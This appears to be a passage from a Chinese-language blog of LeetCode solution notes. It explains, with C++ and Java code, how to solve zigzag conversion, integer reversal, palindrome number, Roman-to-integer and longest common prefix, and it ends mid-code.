href="https://leetcode.cn/problems/zigzag-conversion/">6. Z 字形变换</a></h3><h4 id="解题步骤：按行模拟"><a href="#解题步骤：按行模拟" class="headerlink" title="解题步骤：按行模拟"></a>解题步骤：按行模拟</h4><ol><li><p><strong>处理特殊情况</strong>：如果 <code>numRows == 1</code>，说明不需要 Z 字形排列，直接返回原字符串。</p></li><li><p><strong>定义变量</strong>：</p><ul><li><code>length</code>: 字符串的长度</li><li><code>ans</code>: 最终的结果字符串</li><li>Z 字形一轮的周期为 <code>cycleLen = 2 * numRows - 2</code>，即从最顶层往下，再折回到最顶层所需的字符数。</li></ul></li><li><p><strong>处理每一行的字符：</strong></p><p>a. <strong>第一行（行号 = 0）</strong></p><ul><li>这行的字符位置是间隔 <code>cycleLen</code> 的，比如索引：0，0 + cycleLen，0 + 2*cycleLen，…</li><li>把这些字符依次加入结果中。</li></ul><p>b. <strong>中间行（行号 = 1 到 numRows - 2）</strong></p><ul><li>这些行的字符每轮出现两次，分别在下降和上升阶段。</li><li>对于第 i 行（1 ≤ i &lt; numRows - 1）：<ul><li>第一次出现在位置 <code>j = i</code>；</li><li>第二次出现在 <code>j + cycleLen - 2 * i</code>；</li><li>然后继续循环下一个周期 <code>j += cycleLen</code>；</li><li>每轮取两个字符（如果还在字符串范围内）。</li></ul></li></ul><p>c. <strong>最后一行（行号 = numRows - 1）</strong></p><ul><li>和第一行类似，索引是：<code>numRows - 1</code>, <code>numRows - 1 + cycleLen</code>, …</li><li>依次加入结果中。</li></ul></li><li><p><strong>返回结果字符串 <code>ans</code>。</strong></p></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span>  std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    string <span class="token function">convert</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> numRows<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>numRows <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> s<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        string ans<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">2</span><span class="token operator">*</span>numRows<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numRows<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>length<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                j <span class="token operator">+=</span> <span class="token number">2</span> <span class="token operator">*</span> numRows <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span>                    ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                j <span class="token operator">+=</span> <span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>numRows<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">2</span><span class="token operator">*</span>numRows<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">convert</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> numRows<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>numRows <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> numRows <span class="token operator">==</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">StringBuilder</span> ans <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">2</span><span class="token operator">*</span>numRows<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ans<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numRows<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>length<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ans<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>j <span class="token operator">+=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>numRows <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span>ans<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>j <span class="token operator">+=</span> <span class="token number">2</span> <span class="token operator">*</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>numRows<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">2</span><span class="token operator">*</span>numRows<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ans<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-整数反转"><a href="#7-整数反转" class="headerlink" title="7. 整数反转"></a><a href="https://leetcode.cn/problems/reverse-integer/">7. 整数反转</a></h3><h4 id="解题步骤：模拟"><a href="#解题步骤：模拟" class="headerlink" title="解题步骤：模拟"></a>解题步骤：模拟</h4><ol><li><p><strong>初始化变量</strong>：定义一个整数变量 <code>ans = 0</code>，用于保存反转后的结果。</p></li><li><p><strong>循环处理每一位数字</strong>：</p><ul><li>每次从末尾取一位数字 <code>digit = x % 10</code>。</li><li>把当前这位数字追加到 <code>ans</code> 的末尾（<code>ans = ans * 10 + digit</code>）。</li><li>去掉 <code>x</code> 的末尾数字：<code>x /= 10</code>。</li></ul></li><li><p><strong>在追加前判断是否溢出</strong>：</p><p>因为不能用 64 位整数，要<strong>提前判断乘以 10 之后是否会超出 int 范围</strong>：</p><ul><li><p>正溢出判断：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">&gt;</span> INT_MAX <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">||</span> <span class="token punctuation">(</span>ans <span class="token operator">==</span> INT_MAX <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> digit <span class="token operator">&gt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>因为 <code>INT_MAX = 2147483647</code>，所以当 <code>ans == 214748364</code> 且下一位大于 <code>7</code> 时会溢出。</li></ul></li><li><p>负溢出判断：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">&lt;</span> INT_MIN <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">||</span> <span class="token punctuation">(</span>ans <span class="token operator">==</span> INT_MIN <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> digit <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>INT_MIN = -2147483648</code>，所以当 <code>ans == -214748364</code> 且下一位小于 <code>-8</code> 时会溢出。</li></ul></li></ul></li><li><p><strong>循环结束后返回反转后的 <code>ans</code>。</strong></p></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;climits&gt;</span></span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> digit <span class="token operator">=</span> x <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>            x <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">&gt;</span> INT_MAX <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">||</span> <span class="token punctuation">(</span>ans <span class="token operator">==</span> INT_MAX <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> digit <span class="token operator">&gt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">&lt;</span> INT_MIN <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">||</span> <span class="token punctuation">(</span>ans <span class="token operator">==</span> INT_MIN <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> digit <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            ans <span class="token operator">=</span> ans <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> digit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> digit <span class="token operator">=</span> x <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>x <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>ans <span class="token operator">&gt;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span> <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>ans <span class="token operator">&lt;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MIN_VALUE</span> <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ans <span class="token operator">=</span> ans <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> digit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-回文数"><a href="#9-回文数" class="headerlink" title="9. 回文数"></a><a href="https://leetcode.cn/problems/palindrome-number/">9. 回文数</a></h3><h4 id="解题步骤：双指针法"><a href="#解题步骤：双指针法" class="headerlink" title="解题步骤：双指针法"></a>解题步骤：双指针法</h4><ol><li><strong>排除负数情况</strong>：因为负数的符号 <code>-</code> 使其不可能是回文，所以如果 <code>x &lt; 0</code>，直接返回 <code>false</code>。</li><li><strong>计算整数的位数（位数计数）</strong>：用一个临时变量 <code>a</code>（初始为 <code>x</code>）不断除以 10，直到变成 0，同时计数器 <code>weishu</code> 自增，用来记录整数 <code>x</code> 的位数。</li><li><strong>初始化两个指针</strong>：<ul><li>指针 <code>i</code> 表示从高位开始的索引，初始为 <code>0</code>。</li><li>指针 <code>j</code> 表示从低位开始的索引，初始为 <code>weishu</code>（虽然 <code>j</code> 在后续判断中只控制循环次数，并不直接取位）。</li></ul></li><li><strong>逐位比较高位和低位</strong>：在循环中：<ul><li>使用 <code>int(x / pow(10, weishu - i - 1)) % 10</code> 取出当前的高位第 <code>i</code> 位数字（从左往右）。</li><li>使用 <code>a % 10</code> 取出当前最低位的数字（从右往左）。</li><li>比较两个数字是否相等，不相等则返回 <code>false</code>。</li><li>否则更新 <code>a /= 10</code>，移除最低位数字。</li><li>增加 <code>i</code>，减少比较次数，直到比较到中间。</li></ul></li><li><strong>全部位匹配，返回 true</strong></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath&gt;</span></span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">bool</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token keyword">int</span> weishu <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            a <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>            weishu<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        a <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>j <span class="token operator">=</span> weishu<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>x <span class="token operator">/</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>weishu<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">!=</span> c<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            a <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>            j<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10-20"><a href="#10-20" class="headerlink" title="10-20"></a>10-20</h2><h3 id="13-罗马数字转整数"><a href="#13-罗马数字转整数" class="headerlink" title="13. 罗马数字转整数"></a><a href="https://leetcode.cn/problems/roman-to-integer/">13. 罗马数字转整数</a></h3><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><ol><li><strong>建立罗马字符与数值的映射表</strong>：使用 <code>unordered_map&lt;char, int&gt;</code> 把罗马字符 <code>'I'~'M'</code> 映射到相应的整数值。</li><li>**初始化总和变量 <code>ans</code> 和索引变量 <code>i</code>**：<ul><li><code>ans</code> 用来累加转换结果。</li><li><code>i</code> 用于遍历字符串 <code>s</code>。</li></ul></li><li><strong>遍历字符串（到倒数第二个字符）</strong>：<ul><li>对于当前字符 <code>s[i]</code> 和下一个字符 <code>s[i+1]</code>：<ul><li>如果 <code>s[i] &lt; s[i+1]</code>，说明是“减法规则”，如 <code>IV</code>, <code>IX</code>, <code>XL</code> 等：<ul><li>将 <code>umap[s[i+1]] - umap[s[i]]</code> 加入总和。</li><li>跳过下一位（<code>i++</code>）。</li></ul></li><li>否则：<ul><li>将 <code>umap[s[i]]</code> 加入总和。</li></ul></li></ul></li></ul></li><li><strong>检查是否还有最后一个字符未处理</strong>：如果 <code>i == length - 1</code>，说明最后一个字符没参与“减法规则”，单独加上它的值。</li><li>**返回结果 <code>ans</code>**。</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unordered_map&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    unordered_map<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">&gt;</span> umap<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">romanToInt</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        umap<span class="token punctuation">[</span><span class="token char">'I'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>umap<span class="token punctuation">[</span><span class="token char">'V'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>umap<span class="token punctuation">[</span><span class="token char">'X'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>umap<span class="token punctuation">[</span><span class="token char">'L'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>umap<span class="token punctuation">[</span><span class="token char">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>umap<span class="token punctuation">[</span><span class="token char">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>umap<span class="token punctuation">[</span><span class="token char">'M'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>umap<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> umap<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                ans <span class="token operator">+=</span> umap<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-</span> umap<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                ans <span class="token operator">+=</span> umap<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            ans <span class="token operator">+=</span> umap<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="14-最长公共前缀"><a href="#14-最长公共前缀" class="headerlink" title="14. 最长公共前缀"></a><a href="https://leetcode.cn/problems/longest-common-prefix/">14. 最长公共前缀</a></h3><h4 id="解题步骤：逐字符比较"><a href="#解题步骤：逐字符比较" class="headerlink" title="解题步骤：逐字符比较"></a>解题步骤：逐字符比较</h4><ol><li><strong>初始化变量</strong>：<ul><li><code>length</code>：字符串数组的长度。</li><li><code>ans</code>：用于保存最终的公共前缀。</li></ul></li><li><strong>逐位遍历第一个字符串</strong>（因为公共前缀最多不超过第一个字符串的长度）：<ul><li>使用外层循环 <code>i</code> 遍历 <code>strs[0]</code> 的每个字符。</li></ul></li><li><strong>对每一位进行横向比较</strong>：<ul><li>用 <code>strs[0][i]</code> 作为参考字符 <code>c</code>。</li><li>遍历数组中其余的字符串（从第 1 个开始），检查它们第 <code>i</code> 位的字符是否和参考字符相同。</li><li>如果有任何一个字符串第 <code>i</code> 位不相同，则说明公共前缀在此终止，设置 <code>flag = false</code>，并 <code>break</code>。</li></ul></li><li><strong>根据比较结果更新前缀</strong>：<ul><li>如果 <code>flag == true</code>，说明当前位所有字符串都相同，将当前字符 <code>c</code> 加入到答案中。</li><li>否则，终止外层循环。</li></ul></li><li>**返回结果 <code>ans</code>**。</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    string <span class="token function">longestCommonPrefix</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span><span class="token operator">&amp;</span> strs<span class="token 